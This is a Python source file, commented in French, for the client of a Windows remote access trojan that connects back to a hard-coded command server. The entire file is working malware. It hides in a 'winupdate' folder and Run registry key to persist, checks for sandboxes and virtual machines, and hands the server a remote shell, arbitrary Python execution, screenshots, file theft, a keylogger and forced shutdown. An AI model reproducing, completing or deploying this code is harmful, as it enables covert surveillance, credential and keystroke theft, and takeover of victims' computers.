import socket, os, sys, platform, time, ctypes, subprocess, threading, pynput.keyboard, wmi, json
import win32api, winerror, win32event
from shutil import copyfile
from winreg import *
from io import StringIO, BytesIO
from cryptography.fernet import Fernet
from PIL import ImageGrab

strPath = os.path.realpath(sys.argv[0])  # chemin en cours
TMP_Path = os.environ["TEMP"]  # chemin temporaire
APPDATA_folder = os.environ["APPDATA"]  # chemin environnement Appdata
intBuff = 1024

host = '192.168.43.8'
port = 9999

bin_persistance = False
bin_startup = False


def persistance():  # crer une persistance sur la machine cible
    winupdate = os.path.join(TMP_Path, "winupdate")  # Déclaration du dossier "winupdate" dans le chemin TEMP
    # une vérification est faite afin de s'assurer que le dossier n'existe pas et qu'il ne trouve pas dans le chemin APPDATA
    if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA_folder):
        # si le dossier n'existe pas, on le crer dans le chemin TEMP
        try:
            os.mkdir(winupdate)
        except:
            pass
        # os.path.basename permet de récupérer le nom du dernier élèment d'un chemin
        strNewFile = os.path.join(winupdate, os.path.basename(sys.argv[0]))
        # suppression des liens symbolique et déplacement du dossier winupdate afin de positionner le script batch
        strCommand = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}"
        subprocess.Popen(strCommand, shell=True)  # le processus exècute la commande précédente
        sys.exit(0)


def startup(onstartup):
    try:
        # os.path.basename permet de récupérer le nom du dernier élèment d'un chemin
        strAppPath = os.path.join(APPDATA_folder, os.path.basename(strPath))
        if not os.getcwd() == APPDATA_folder:
            copyfile(strPath, strAppPath)
        # utilisation du registre windows pour étabilir la persistance
        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        # association de la clé a la tache winupdate (winreg : Reg_SZ termine par 0)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath)
        CloseKey(objRegKey)
    except WindowsError:
        if not onstartup:
            send(b"Impossible de lancer une tache automatique")
    else:
        if not onstartup:
            send(b"Reussite")


def detect_Sandbox():
    try:
        # appel la librairie SbieDLL afin de vérifier s'il sagit d'une sandbox
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True


def detect_VM():
    objWMI = wmi.WMI()
    # Permet de verifier s'il existe une classe correspondrai au nom VM
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return True
    return False


def connexion_serveur():
    global objSocket, objEncrypt
    while True:  # connexion à l'infinie
        try:
            objSocket = socket.socket()
            objSocket.connect((host, port))
        except socket.error:
            time.sleep(5)
        else:
            break

    arrUserInfo = [socket.gethostname()]
    strPlatform = f"{platform.system()} {platform.release()}"
    if detect_Sandbox():
        strPlatform += " (Sandboxie) "
    if detect_VM():
        strPlatform += " (Virtual Machine) "
    arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])

    objSocket.send(json.dumps(arrUserInfo).encode())

    objEncrypt = Fernet(objSocket.recv(intBuff))


# Fonction de reception des données qui seront déchiffré
recv = lambda buffer: objEncrypt.decrypt(objSocket.recv(buffer))

# Fonction de reception des données qui seront chiffré
send = lambda data: objSocket.send(objEncrypt.encrypt(data))

if bin_persistance: persistance()
if bin_startup: startup(True)

connexion_serveur()


def remove_from_startup():  # Suppression de la tache automatique
    try:
        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        DeleteValue(objRegKey, "winupdate")
        CloseKey(objRegKey)
    except FileNotFoundError:
        send(b"La tache automatique n est pas installe.")
    except WindowsError:
        send(b"Une erreur a ete detecte lors de la suppression!")
    else:
        send(b"Reussite")


def reception(buffer):  # Reception des données
    bytData = b""  # bytes
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncrypt.decrypt(bytData)


def envoi(data):  # envoi des données
    bytEncryptedData = objEncrypt.encrypt(data)
    data_size = len(bytEncryptedData)
    send(str(data_size).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)


def screenshot():
    snapshot = ImageGrab.grab()
    with BytesIO() as objBytes:
        snapshot.save(objBytes, format="PNG")
        objPic = objBytes.getvalue()
    envoi(objPic)


def telechargement(data):  # telechargement d'un fichier
    intBuffer = int(data)
    file_data = reception(intBuffer)
    strOutputFile = recv(intBuff).decode()

    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(file_data)
        send(b"Effectue!")
    except:
        send(b"Le chemin est inaccessible ou protege...")


def televersement(data):  # envoi des données
    if not os.path.isfile(data):
        send(b"Fichier introuvable!")
        return

    with open(data, "rb") as objFile:
        envoi(objFile.read())


def Verrouillage():
    # Verrouillage du pc cible
    ctypes.windll.user32.LockWorkStation()


def shutdown(shutdowntype):  # arret ou redemarrage du pc cible
    command = f"shutdown {shutdowntype} -f -t 30"  # redemarrage ou arret forcée ou de la machine dans un délai de 30 sec
    subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    objSocket.close()
    sys.exit(0)


def commande_shell():
    strCurrentDir = os.getcwd()  # Renvoie le répertoire de travail courant d'un processus
    send(os.getcwdb()) # renvoi le répertoire de travail actuel
    bytData = b""

    while True:
        strData = recv(intBuff).decode()

        if strData == "goback":
            os.chdir(strCurrentDir)  # retour au repertoire précédent
            break
        #cette étape va permettre le déplacement dans l'arborescence
        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            if objCommand.stderr.read().decode() == "":
                # decode et supprime les lignes en trop
                strOutput = (objCommand.stdout.read()).decode().splitlines()[0]
                os.chdir(strOutput)
                #recupere la nouvelle position dans l'arborescence.
                bytData = f"\n{os.getcwd()}>".encode()
        #Cette étape permet de saisir tout types de commande.
        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            # déchiffrement des commandes
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()
            bytData = (strOutput + b"\n" + os.getcwdb() + b">")
        else:
            bytData = b"Erreur!"

        envoi(bytData)  # envoi les réponses au serveur


def python_interpreter():
    send(b"received")
    while True:
        strCommand = recv(intBuff).decode()
        if strCommand == "exit":
            send(b"exiting")
            break
        old_stdout = sys.stdout
        redirected_output = sys.stdout = StringIO()
        try:
            exec(strCommand)
            print()
            strError = None
        except Exception as e:
            strError = f"{e.__class__.__name__}: "
            try:
                strError += f"{e.args[0]}"
            except:
                pass
        finally:
            sys.stdout = old_stdout

        if strError:
            envoi(strError.encode())
        else:
            envoi(redirected_output.getvalue().encode())


def MessageBox(message):  # permet d'ouvrir une fenetre popup de communication
    strScript = os.path.join(TMP_Path, "m.vbs")
    with open(strScript, "w") as objVBS:
        # vbOKOnly : bouton ok | vbInformation : affiche l'icone "message d'information" | vbSystemModal : interromp les applications
        objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                     stdin=subprocess.PIPE, shell=True)


def OnKeyboardEvent(event):  # initialise les commandes spécial du clavier pour la partie keylogger
    global strKeyLogs

    try:
        strKeyLogs
    except NameError:
        strKeyLogs = ""

    if event == Key.backspace:
        strKeyLogs += " [Bck] "
    elif event == Key.tab:
        strKeyLogs += " [Tab] "
    elif event == Key.enter:
        strKeyLogs += "\n"
    elif event == Key.space:
        strKeyLogs += " "
    elif type(event) == Key:
        strKeyLogs += f" [{str(event)[4:]}] "
    else:
        strKeyLogs += f"{event}"[1:len(str(event)) - 1]


KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key


def keylogger(option):
    global strKeyLogs

    if option == "start":
        if not KeyListener.running:
            KeyListener.start()
            send(b"success")
        else:
            send(b"Erreur")

    elif option == "stop":
        if KeyListener.running:
            KeyListener.stop()
            # réinitialise la thread
            threading.Thread.__init__(KeyListener)
            strKeyLogs = ""
            send(b"success")
        else:
            send(b"Erreur")

    elif option == "dump":
        if not KeyListener.running:
            send(b"Erreur")
        else:
            if strKeyLogs == "":
                send(b"Erreur log")
            else:
                time.sleep(0.2)
                envoi(strKeyLogs.encode())
                strKeyLogs = ""  # réinitialise les logs


def main():
    while True:
        try:
            while True:
                strData = recv(intBuff)
                strData = strData.decode()

                if strData == "exit":
                    objSocket.close()
                    sys.exit(0)
                elif strData[:3] == "msg":
                    MessageBox(strData[3:])
                elif strData == "startup":
                    startup(False)
                elif strData == "rmvstartup":
                    remove_from_startup()
                elif strData == "screen":
                    screenshot()
                elif strData[:4] == "send":
                    telechargement(strData[4:])
                elif strData[:4] == "recv":
                    televersement(strData[4:])
                elif strData == "lock":
                    Verrouillage()
                elif strData == "shutdown":
                    shutdown("-s")
                elif strData == "restart":
                    shutdown("-r")
                elif strData == "test":
                    continue
                elif strData == "cmd":
                    commande_shell()
                elif strData == "python":
                    python_interpreter()
                elif strData == "keystart":
                    keylogger("start")
                elif strData == "keystop":
                    keylogger("stop")
                elif strData == "keydump":
                    keylogger("dump")
        except socket.error:  # if the server closes without warning
            objSocket.close()
            del objSocket
            connexion_serveur()
    main()


main()

